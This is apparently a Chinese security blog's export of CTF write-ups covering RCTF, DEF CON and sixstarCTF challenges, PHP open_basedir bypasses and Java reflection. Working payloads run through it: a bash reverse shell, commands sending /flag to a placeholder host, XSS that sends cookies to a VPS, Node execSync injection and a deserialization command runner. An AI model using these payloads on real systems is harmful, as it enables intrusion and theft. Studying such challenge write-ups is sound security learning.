请求就有flag了1http://nextphp.2019.rctf.rois.io/?a=$a=unserialize('C%3A1%3A%22A%22%3A91%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A28%3A%22int+system%28const+char+%2Acmd%29%3B%22%3B%7D%7D');var_dump($a-&gt;ret-&gt;system('bash -c \"cat /flag &gt; /dev/tcp/ip/port\"')); rblog这题源码里面有一个apihttps://rblog.2019.rctf.rois.io/api/v2/posts，修改一下参数/api/v2/aaa发现回显12345&#123; \"status\": false, \"message\": \"'\\/aaa' not found.\", \"data\": []&#125; 尝试在后面添加标签也不能解析，返回的content-type是json，这个时候想到/api/v2/的v2是表示版本号的，后台有没有v1呢，访问一下/api/v1/posts，发现居然正常回显！！！再尝试一下在后面加标签，这次返回是content-type: text/html了，也就是说可以成功执行xss了贴上题目的提示所以我们可以尝试一下/api/v1/posts?callback=test，这个时候会返回1test(&#123;...&#125;) 但是如果我们改成&lt;script&gt;标签打过去，/会被转义，fuzz一下，转义的只有斜杠和引号，所以我们可以用iframe执行实体编码打过去来绕过，到了这里还有一个难点，题目说了bot用的是最新版的chrome，如果url中的代码和页面内的代码一致就会拦截，而且这个拦截还严格很多，有没有什么方法可以绕过呢？思考一下，假设传进一个无用的参数，这个参数在回传的时候会被后台转义，因此就会造成代码不同实现绕过，这里可以知道中文字符的存储是unicode编码的，自带斜杠，所以我们只要加上中文字符就行，最后的payload1https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc%3D%E5%95%8A%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2332%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23120%3B%26%23120%3B%26%23120%3B%26%2358%3B%26%23120%3B%26%23120%3B%26%23120%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2363%3B%26%2339%3B%26%2337%3B%26%2350%3B%26%2398%3B%26%23101%3B%26%23115%3B%26%2399%3B%26%2397%3B%26%23112%3B%26%23101%3B%26%2340%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2341%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E 提交给管理员就可以拿到flag了 ez4cr题目如下依旧是xss，这次要打的是report-rblog的cookie，结合上一题的提示the flag for rblog2019.2 is in the cookie of the report domain. You may need a chrome xss auditor bypass ._.，应该不会是audition的0day，只能继续分析题目场景先看一下题目源码report.js这里有个report.php，跟过去看一下，测试一下，发现他也是support jsonp的测试一下中文，这次不行了然后测试过去发现后端会将传过去的http改成https传回来，所以我们只要修改src的路径为http就能bypass了，payload1https://report-rblog.2019.rctf.rois.io/report.php?callback=&lt;script%20src=http://report-rblog.2019.rctf.rois.io/report.php?callback=location.href=%27http://vps_ip/xss?%27%25%32%62escape(document.cookie);&gt;&lt;/script&gt; report给bot就能拿到flag了1RCTF&#123;charset_in_content-type_ignored._.??did_i_find_a_chrome_xss_filter_bypass_0day&#125; jail这个页面登录注册进去看见一个编写留言的框，一个反馈给admin看留言，还有一个文件上传的地方抓个包先看一看有没有什么提示看到有两个hint，flag1_is_in_cookie和meta_refresh_is_banned_in_server，所以应该是要打到admin的cookie，所以应该是xss的利用，我们先继续审计一下源码+fuzz一下字符，看下有没有什么限制在火狐操作了一波，用img标签打过去没有反应，猜测bot应该是chrome的，而且还禁止了跳转1234567&lt;script&gt;window.addEventListenr(\"beforeunload\", function (event)&#123; event.returnValue = \"Are you sure want to exit?\" return \"Are you sure want to exit?\"&#125;)Object.freeze(document.location)&lt;/script&gt; freeze对象以后是没有办法解冻的，只能克隆一个具有相同属性的新对象，通过修改新对象的属性来达到目的看一下location有什么能利用尝试一下换一下属性，发现host和hostname可以修改属性且跳转，最终利用1234567891011&lt;script&gt; function stringToHex(str)&#123; var val=\"\"; for(var i = 0; i &lt; str.length; i++)&#123; if(val == \"\") val = str.charCodeAt(i).toString(16); else val += str.charCodeAt(i).toString(16); &#125; return val; &#125; location.hostname=stringToHex(document.cookie).substr(0,500)+\".onsdtb.ceye.io\"&lt;/script&gt; 最后看dns流量就行 password还是先看题目所以我们现在先想办法拿到inter.html MISCdrawlogo command语句，找个在线工具就能解出来 这场比赛出题还是很不错的，菜鸡学到了不少，涨姿势了Orz","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/21/2019-RCTF-wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 defcon ctf 学习","date":"2019-05-18T16:00:00.000Z","path":"2019/05/19/defcon-ctf-学习/","text":"菜鸡web手这场比赛全程挂机……web是真的越来越难打了 cant_even_unplug_it一题脑洞了2333题目+hint放一放12345You know, we had this up and everything. Prepped nice HTML5, started deploying on a military-grade-secrets.dev subdomain, got the certificate, the whole shabang. Boss-man got moody and wanted another name, we set up the new names and all. Finally he got scared and unplugged the server. Can you believe it? Unplugged. Like that can keep it secret…Hint: these are HTTPS sites. Who is publicly and transparently logging the info you need?Just in case: all info is freely accessible, no subscriptions are necessary. The names cannot really be guessed. 一开始看到这道题目懵逼了，怎么没有网站？？？经过菜鸡谷歌+半懵半猜终于读懂了题目（wtcl他们在military-grade-secrets.dev这个子域建了一个网站，但是他们改变了网站名，所以我们首先要将原来的网站名找出来首先所有的域名和名称更改都通过DNS进行追踪，用https://securitytrails.com/dns-trails 去查看同一个子域下的其他域名，可以看到这个访问一下secret-storage.military-grade-secrets.dev发现会自动跳转去forget-me-not.even-more-militarygrade.pw这个网站现在我们再看一下forget-me-not.even-more-militarygrade.pw这个网站，可以看到这里有个DigitalOcean所以这个网站曾经在Digital Ocean上托管过，接着再去https://archive.org/web/ 去找网站的快照就会找到4月27日有一个 redacted-puzzleidentify分析一波，可以看到只有个别像素变了，其他基本没变1234567891011121314151617181920212223242526272829303132333435redacted-puzzle.gif[0] GIF 1280x720 1280x720+0+0 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[1] GIF 592x595 1280x720+341+61 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[2] GIF 592x602 1280x720+341+59 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[3] GIF 577x608 1280x720+353+56 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[4] GIF 409x610 1280x720+334+56 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[5] GIF 616x592 1280x720+332+76 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[6] GIF 616x619 1280x720+332+49 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[7] GIF 590x584 1280x720+362+49 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[8] GIF 486x586 1280x720+466+47 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[9] GIF 495x630 1280x720+460+45 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[10] GIF 504x630 1280x720+451+45 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[11] GIF 574x581 1280x720+323+96 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[12] GIF 635x635 1280x720+323+42 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[13] GIF 572x637 1280x720+387+42 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[14] GIF 352x287 1280x720+607+392 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[15] GIF 559x559 1280x720+320+121 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[16] GIF 640x640 1280x720+320+40 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[17] GIF 640x640 1280x720+320+40 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[18] GIF 458x640 1280x720+411+40 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[19] GIF 640x549 1280x720+320+131 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[20] GIF 640x559 1280x720+320+121 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[21] GIF 565x559 1280x720+395+121 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[22] GIF 347x528 1280x720+320+152 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[23] GIF 638x450 1280x720+320+107 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[24] GIF 636x634 1280x720+322+43 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[25] GIF 633x634 1280x720+324+43 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[26] GIF 632x630 1280x720+324+45 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[27] GIF 583x630 1280x720+370+45 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[28] GIF 583x625 1280x720+370+47 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[29] GIF 622x474 1280x720+330+198 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[30] GIF 620x618 1280x720+330+52 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[31] GIF 589x614 1280x720+332+52 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[32] GIF 449x612 1280x720+334+54 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[33] GIF 605x608 1280x720+336+56 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[34] GIF 600x431 1280x720+341+230 8-bit sRGB 4c 80KB 0.000u 0:00.000 stego看一下有个字母表？接着identify -verbose redacted-puzzle.gif查看一下图片签名，可以看到black被定义了三次？？123456789Colors: 1Histogram: 352240: ( 0, 0, 0,255) #000000FF blackColormap entries: 4Colormap: 0: ( 0, 0, 0,255) #000000FF black 1: ( 0, 0, 0,255) #000000FF black 2: ( 0, 0, 0,255) #000000FF black 3: (255,255,255, 0) #FFFFFF00 srgba(255,255,255,0) 因此即使底色为黑色，图片依旧能存储，所以其实图片的存储并不是真正的一整张图片的存储的，我们尝试一下修改一下每帧的调色板并且将它们保存成png图片123456789#!conding: utf-8from PIL import Image# 修改底色，保存图片imageObject = Image.open(\"./redacted-puzzle.gif\")for frame in range(0,imageObject.n_frames): imageObject.seek(frame) imageObject.putpalette([255,0,0,0,0,0,0,0,0]) rgb_im = imageObject.convert('RGB') rgb_im.save(\"./tmp/output-%02u.png\" % frame) 接下来就是脑洞了，拿到了上面的图片，都是一堆多边形，但是如果我们将它们全部拼在一起可以拿到一个八边形，让我们假设成二进制，就可以拿到一堆二进制，先看第一张图片所以这个图片的二进制数就是10001100我们将这些数字都列出来，联系字母表是32位，我们推测试base32变种12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 解密flag_alphabet = \"+-=ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;\"flag_bits=[ \"10001100\", \"01100011\", \"11100100\", \"01000110\", \"10000101\", \"00111101\", \"01000010\", \"10011000\", \"11100000\", \"11110100\", \"10000000\", \"00101101\", \"01110010\", \"00011100\", \"00001000\", \"10100101\", \"11010111\", \"01101110\", \"10100110\", \"10010001\", \"10111100\", \"10000100\", \"10000001\", \"10111001\", \"11010100\", \"00111011\", \"11001110\", \"11110010\", \"00011110\", \"10011101\", \"11001001\", \"11000111\", \"01100101\", \"00011110\", \"10011111\",]# base32解密flag_bits = \"\".join(flag_bits)result = \"\"for i in range(0,len(flag_bits),5): index = flag_bits[i:i+5] index = int(index,2) result += flag_alphabet[index]print(\"result: \", result) 所以最后解出来是 nodb源码有个这个东西12345678function validateForm() &#123; str = document.forms[\"myForm\"][\"password\"].value ptr = allocate(intArrayFromString(str), 'i8', ALLOC_NORMAL); ret = UTF8ToString(_authenticate(ptr)); console.log(ret); if (ret == \"success\") document.getElementsByClassName(\"text\")[0].innerText = \"SUCCESS\" return false;&#125; 所以如果一个字符串通过了_authenticate函数的认证而且放回seccess就是正确的flag了接下来我们找一下_authenticate在哪里出现过有一个wasm.wasm文件，我们先丢进去反编译一下，因为菜鸡的文件不知道为什么损坏了，所以只能贴上其他大师傅的图了可以看到，如果要返回success，那就要满足v6==69，但是这一段逆回去很难，代码很复杂，V6是计算这段字母里面有多少个字母是符合password的，因此，我们尝试一下暴力转v6，而且每一次强制匹配一个字母继续看wasm文件，将它转成wat文件（虽然也不算非常好看，但是还是能看出来的，搜一下1245只出现过一次，分析文件利用_authenticate返回正确的字数，我们一位位将flag爆出来","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/19/defcon-ctf-学习/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"open_basedir bypass","date":"2019-05-14T16:00:00.000Z","path":"2019/05/15/open_basedir-bypass/","text":"前言之前在出国赛题的时候，设置open_basedir的时候突发奇想，可不可以绕过open_basedir呢，谷歌了一波，发现确实有不少的tricks，遂来总结一波 DirectoryIterator + Glob列目录DirectoryIterator是一个php提供的用于查看文件系统目录的一个接口，调用它是可以直接看到文件目录的，但是如果我们设置了open_basedir的时候，用它列举不允许的目录，就会直接导致服务器500glob是自php5.3起用来查找匹配的文件路径模式的一个流包装器当他们组合一起的时候就很炫了12345678910111213141516&lt;?phpprintf('open_basedir: %s &lt;/br&gt;',ini_get('open_basedir'));$file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f)&#123; $file_list[] = $f-&gt;__toString();&#125;$it = new DirectoryIterator(\"glob:///.*\");foreach ($it as $f)&#123; $file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach ($file_list as $f)&#123; echo \"&#123;$f&#125;&lt;br/&gt;\";&#125; 可以看到，成功地列出了目录了，这个漏洞直到php7还能用，测试环境是linux+php7（摇头.gif realpath列目录realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了open_basedir的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open_basedir里的文件的话，他就会返回file is not within the allowed path(s)，所以这个时候就可以类似于报错盲注去爆出文件名了这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点12345678910111213141516171819&lt;?phpini_set('open_basedir',dirname(__FILE__));printf(\"open_basedir: %s&lt;br/&gt;&lt;br/&gt;\", ini_get('open_basedir'));set_error_handler('isexist');$dir = 'd:/test/';$file = '';$chars = 'abcdefghijklmnopqrstuvwxyz0123456789-*/+_';for ($i=0; $i&lt;strlen($chars); $i++)&#123; $file = $dir.$chars[$i].'&lt;&lt;'; realpath($file);&#125;function isexist($errno, $errstr)&#123; $regex = '/File\\((.*)\\) is not within/'; printf(\"errstr: %s &lt;br/&gt;\",$errstr); preg_match($regex, $errstr, $mathes); if (isset($mathes[1]))&#123; printf(\"%s &lt;br/&gt;&lt;br/&gt;\", $mathes[1]); &#125;&#125; 可以看到，当报错的时候会将文件名也直接爆出来，因此如果文件名首字母不一致的话，跑一次就能直接将所有文件名跑出来了，如果重复问题也不大，改下前缀也都能出来的 SplFileInfo::getRealPath列目录SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的realpath很相似，就是getRealPath，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了open_basedir的设定12345678910111213&lt;?phpini_set('open_basedir', dirname(__FILE__));printf(\"open_basedir: %s &lt;br/&gt;&lt;br/&gt;\", ini_get('open_basedir'));$basedir = 'd:/test/';$arr = array();$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';for ($i=0; $i &lt; strlen($chars); $i++) &#123; $info = new SplFileInfo($basedir . $chars[$i] . '&lt;&lt;'); $re = $info-&gt;getRealPath(); if ($re) &#123; echo $re.\"&lt;br&gt;\"; &#125;&#125; 这里基本就是realpath的利用，相差不大，甚至还简单一点 bindtextdomainbindtextdomain是一个域的操作的函数？？ 利用文件夹bypass之前师兄在群上发过一张图可以看到open_basedir是/var/www/html，但是经过这些操作居然能读到根目录了，先跟过去看一下底层的实现是怎样的，它们对应的函数是12ini_set: PHP_FUNCTION(ini_set)ini_get: PHP_FUNCTION(ini_get)","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"sixstarCTF web 学习","date":"2019-05-08T07:03:29.438Z","path":"2019/05/08/sixstarCTF-web-学习/","text":"前段时间忙着国赛出题，没认真打这场比赛，补坑辣 WEBmywebsql这道题目考了mywebsql的一个cve还有信号处理？？坑点啊首先我们可以先弱口令admin/admin登录进去，然后就是谷歌做题了2333https://nvd.nist.gov/vuln/detail/CVE-2019-7731https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md大概操作是创建一个表在里面写一句shell，再备份数据库就可以成功写到一个shell了首先我们创建一个表，并在数据库中插入一句小马接着导出数据库，并且修改文件名为shell.php，至此我们就成功写了一个shell了接着御剑连过去，能看到一个flag文件和一个readflag文件我们没有权限直接读flag文件，尝试一下连接终端，但是我们没有输入就已经直接退出了接下来只能分析readflag文件了文件里面有个ualarm函数，可以发出时钟信号让终端停止当前的程序，所以我们没输入，就结束程序了先弹个shell，跟上面操作一样，就是改成sh文件就行1bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1 接着就是找命令让他停止了https://codingstandards.iteye.com/blog/836588因此我们可以先执行trap命令，然后就能慢慢进行下一步操作了最终payload1trap \"\" 14 接下来就是慢慢算式子，出flag了 996game一个小游戏，虽然我不知道怎样通关和通关是8是就能拿到flag（捂脸源码提示这个东西是用一个github项目改的接着路由没过滤好，所以就是下文件找不同在/js/server/GameServer.js有个这个东西可以看到改版多了个eval函数，接着执行err.message的东西所以我们现在是想办法控制报错信息了根据题目提示，db.a.find({&quot;b&quot;:{&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;}})，先本地尝试一下可以看到errormsg是可以控制的，然后就是想办法控制_id了接着跟去ObjectID可以看到方法的具体内容，这个要在github去下接着就是跟过去分析了因此最后只需要满足两个条件就能绕过了1&#123;“$gt”:”1”,”c”:”d”,”toHexString”:true,”id”:&#123;“length”:12&#125;&#125; 这个时候能得到报错123456 &#123; \"ok\":0, \"errmsg\":\"unknown operator: c\", \"code\":2,\"codeName\":\"BadValue\", \"name\":\"MongoError\"&#125; 所以此时eval内部的东西已经可控了，最后借用大佬们的脚本1234#进行lsClient.getPlayerID = () =&gt; (&#123; \"$gt\":1,\"socket.emit(require('child_process').execSync('ls'))\":\"bb\", toHexString: 'aaa', length: 0, id: &#123;length: 12&#125;&#125;)#perl运行读文件Client.getPlayerID = () =&gt; (&#123; \"$gt\":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('perl -e \\\\'use warnings;use strict;use IPC'+String.fromCharCode(58)+String.fromCharCode(58)+'Open2;$| = 1;chdir(\"/\");my $pid = open2(\\*out2, \\*in2, \"./readflag\") or die;my $reply = &lt;out2&gt;;print STDOUT $reply; $reply = &lt;out2&gt;;print STDOUT $reply; my $answer = eval($reply);print in2 \" $answer \"; in2-&gt;flush();$reply = &lt;out2&gt;;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;\\\\'').toString('utf-8'))`]:\"bb\", toHexString: 'aaa', length: 0, id: &#123;length: 12&#125;&#125;) MISCbabyflash首先可以拿到一个swf文件，然后去反编译一下，可以看到有一堆图片和一个音频图片很规律，张数刚好是441=21*21，尝试一下拼在一起12345678910111213141516171819202122232425262728293031323334#先读图片出来成0和1#coding: utf-8from PIL import Imagedef run(a): img = Image.open(\"frames/\"+str(i)+\".png\") a,b,c,d = img.getpixel((50,50)) return as = ''for i in range(1,442): if run(i)==0: s += '1' else: s += '0'print(s)#然后再拼在一起#coding: utf-8from PIL import Imagelength = 21img = Image.new('RGB', (length*5, length*5))#黑点为1白点为0data = \"111111100110001111111100000100111001000001101110101011001011101101110100100101011101101110100101101011101100000100110001000001111111101010101111111000000001010100000000111011111011111000100110110011011101111011101101111001101111011010010001100000000011111010100000100011000000000001011100110011111111101011100110101100000101101000100010101110101011011000001101110100101101110000101110101101110110001100000101011100010010111111101101100001011\"for x in range(length): for y in range(length): if data[x*length+y] == '1': for xx in range(x*5, x*5+5): for yy in range(y*5, y*5+5): img.putpixel([xx, yy], (0,0,0)) else: for xx in range(x*5, x*5+5): for yy in range(y*5, y*5+5): img.putpixel([xx, yy], (255,255,255))img.save('out.png') 拼在一起确实是一个二维码，扫出来只有前半个flag，那么后面的flag就是音频隐写了接下来的音频看频谱图就能看出来了 参考https://xz.aliyun.com/t/5006#toc-2https://aluvion.github.io/2019/05/05/CTF2019-996game%E5%A4%8D%E7%8E%B0-nodejs-mongodb%E4%BD%BF%E7%94%A8/","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/08/sixstarCTF-web-学习/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"反射","date":"2019-05-07T07:14:45.468Z","path":"2019/05/07/反射/","text":"前言前段时间的国赛考到了这个东西，肉鸡就来总结一下了 reflection in PHP在php运行的时候，反射可以对类、接口、函数、方法或扩展进行反向工程，此外，还可以取出函数、类和方法中的文档注释。 简单的demo下面放一个简单的demo，简单看一下反射是怎样实现的12345678910111213141516171819202122232425262728&lt;?phpclass test&#123; private $test = \"Ariel\"; private $value = \"Xi4or0uji\"; private function get()&#123; $this -&gt; test = \"Ariel\"; return $this-&gt;test; &#125; private function hello()&#123; return \" hello world\"; &#125;&#125;$test = new test();//获得方法的返回值$ref = new ReflectionClass($test);$method = $ref-&gt;getMethod(\"hello\");//setAccessible可以执行私有或保护方法$method -&gt; setAccessible(true);print $method -&gt; invoke($test).\"&lt;br&gt;\";//获得成员变量的名和值$reflect = new ReflectionClass($test);$props = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PRIVATE | ReflectionProperty::IS_PROTECTED);foreach ($props as $prop)&#123; $prop-&gt;setAccessible(true); print $prop-&gt;getName().\"&lt;br&gt;\"; print $prop-&gt;getValue($test).\"&lt;br&gt;\";&#125; 回显12345hello worldtestArielvalueXi4or0uji CTF题目上次的国赛题就有这题，具体可以看https://xi4or0uji.github.io/2019/04/22/2019-4-22-2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-writeup/#more reflection in JAVAjava的反射跟php的反射很相似，想解剖一个类，先要获取到这个类的字节码文件对象，使用的是Class类中的方法，因此我们要先获取到每一个字节码文件对应的Class类型的对象 简单的demo下面还是一个简单的demo去说明怎么调用123456789101112131415161718192021222324252627282930313233//Member.java文件package com.company;public class Member &#123; public void show(String s)&#123; System.out.println(\"hello \" + s); &#125;&#125;//Test.java文件package com.company;import java.lang.reflect.Method;public class Test &#123; public static void main(String[] args) throws Exception&#123;// 获取Class对象 Class stuClass = Class.forName(\"com.company.Member\");// 获得所有公有方法 System.out.println(\"get public function\"); stuClass.getMethods(); Method[] methodArray = stuClass.getMethods(); for (Method m : methodArray)&#123; System.out.println(m); &#125;// 通过反射调用Student下的show方法 Method m = stuClass.getMethod(\"show\", String.class); System.out.println(m); //实例化一个Student对象 Object obj = stuClass.getConstructor().newInstance(); m.invoke(obj, \"Ariel\"); &#125;&#125; 然后我们就能看到成功调用了 反射调出计算器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package com.company;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.Method;public class ReflectionTest implements Serializable &#123; private Integer n; public ReflectionTest(Integer n)&#123; this.n = n; &#125; public String int2string(Integer n)&#123; System.out.println(\"here\"); return Integer.toString(n); &#125; private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; in.defaultReadObject(); try&#123; Method method = java.lang.Runtime.class.getMethod(\"exec\", String.class); Object result = method.invoke(Runtime.getRuntime(), \"calc.exe\"); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args)&#123; ReflectionTest x = new ReflectionTest(12); operation.ser(x); operation.deser(); &#125;&#125;class operation &#123; public static void ser(Object obj)&#123; //序列化操作写数据 try&#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"Object.obj\")); oos.writeObject(obj); oos.flush(); oos.close(); &#125;catch (FileNotFoundException e)&#123; e.printStackTrace(); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void deser()&#123; //反序列化读数据 try&#123; File file = new File(\"Object.obj\"); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file)); Object x = ois.readObject(); System.out.println(x); ois.close(); &#125;catch (FileNotFoundException e)&#123; e.printStackTrace(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 参考https://www.php.net/manual/zh/intro.reflection.phphttps://aluvion.github.io/2019/04/25/%E5%8F%8D%E5%B0%84/http://pupiles.com/java_unserialize2.html","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/07/反射/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xi4or0uji.github.io/tags/java/"},{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"CONFidence CTF的一道题","date":"2019-04-24T16:00:00.000Z","path":"2019/04/25/CONFidence-CTF的一道题/","text":"这道题是之前在看先知的文章看到了，看了一下发现有点有趣，记录一下 题目地址：http://web50.zajebistyc.tf/预期解是svg xss，非预期是缓存投毒首先我们先看一下题目，进去是登录框，随便乱填就可以进去进去以后有一个头像上传的地方和secret的值，猜测应该是拿到管理员的secret值，然后利用点应该就是头像上传的地方了 SVG XSS在测试的过程中发现可以上传任意后缀的文件，但是文件头必须是图片格式且尺寸只能是100*100，而且上传html文件时发现服务器会将文件当做图片解析，因此后台应该是根据文件头去进行解析的，所以我们可以找一个可以进行xss的图片，也就是svg原理参考： https://www.hackersb.cn/hacker/85.htmlpayload123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;&lt;svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" width=\"100px\" height=\"100px\" viewBox=\"0 0 751 751\" enable-background=\"new 0 0 751 751\" xml:space=\"preserve\"&gt; &lt;image id=\"image0\" width=\"751\" height=\"751\" x=\"0\" y=\"0\" 